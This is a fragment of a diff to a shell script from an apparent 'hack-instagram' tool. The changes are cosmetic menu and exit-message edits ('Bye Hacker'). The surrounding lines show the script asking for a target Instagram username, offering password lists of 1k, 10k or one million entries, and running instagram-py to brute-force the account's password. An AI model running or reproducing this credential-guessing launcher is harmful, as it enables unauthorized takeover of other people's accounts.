@@ -24,9 +24,9 @@ printf "\n"
 echo
 read -p "[#] User Name : " usrnm
 echo
-echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
-              [+]$red Type$ylo 2$red FOR 10K Passwords$grn
-              [+]$red Type$ylo 3$red FOR 1Million Passwords $rset"
+echo -e "$grn              [÷÷]$red Type This$ylo 1$red FOR 1k Passwords$grn
+              [÷÷]$red Type This$ylo 2$red FOR 10K Passwords$grn
+              [÷÷]$red Type This$ylo 3$red FOR 1Million Passwords $rset"
 echo
 read -p "[#] Enter Selected Number: " marks
 echo 
@@ -43,7 +43,7 @@ then
     instagram-py --username $usrnm --password-list $HOME/hack-instagram/pass/pass3.txt
 else
 echo
-echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
+echo -e  "$ylo >>> exiting........! Bye Hacker :) <<<$rset"
 echo
 sleep 1.0
 cd $HOME
